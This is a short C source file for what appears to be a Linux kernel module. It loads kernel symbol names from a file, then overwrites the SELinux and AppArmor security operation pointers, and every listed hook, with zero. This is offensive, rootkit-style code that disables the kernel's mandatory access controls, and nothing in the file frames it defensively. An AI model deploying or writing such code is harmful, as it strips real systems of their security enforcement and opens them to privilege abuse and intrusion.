#include "shim.h"
#include "logging.h"
#include "util.h"
#include <linux/string.h>
#include <linux/version.h>

#define MAX_HOOKS 10
static const char *hook_targets[MAX_HOOKS];
static int hook_count = 0;

void load_hooks_from_file(const char *path) {
    struct file *file;
    mm_segment_t old_fs;
    char buffer[256];
    int bytes_read = 0, offset = 0;

    old_fs = get_fs();
    set_fs(KERNEL_DS);

    file = filp_open(path, O_RDONLY, 0);
    if (!file || IS_ERR(file)) {
        set_fs(old_fs);
        return;
    }

    while ((bytes_read = kernel_read(file, buffer + offset, sizeof(buffer) - offset - 1, &file->f_pos)) > 0) {
        buffer[bytes_read + offset] = '\0';
        char *line = buffer;
        char *newline;

        while ((newline = strsep(&line, "\n")) != NULL && hook_count < MAX_HOOKS) {
            if (*newline) hook_targets[hook_count++] = kstrdup(newline, GFP_KERNEL);
        }
        offset = 0;
    }
    filp_close(file, NULL);
    set_fs(old_fs);
}

void disable_lsm_hooks(void) {
    uintptr_t selinux_addr = get_selinux_ops();
    uintptr_t apparmor_addr = get_apparmor_ops();

    if (selinux_addr) *(uintptr_t *)selinux_addr = 0;
    if (apparmor_addr) *(uintptr_t *)apparmor_addr = 0;

    for (int i = 0; i < hook_count; i++) {
        uintptr_t hook_addr = find_kernel_symbol(hook_targets[i]);
        if (hook_addr) *(uintptr_t *)hook_addr = 0;
    }
}
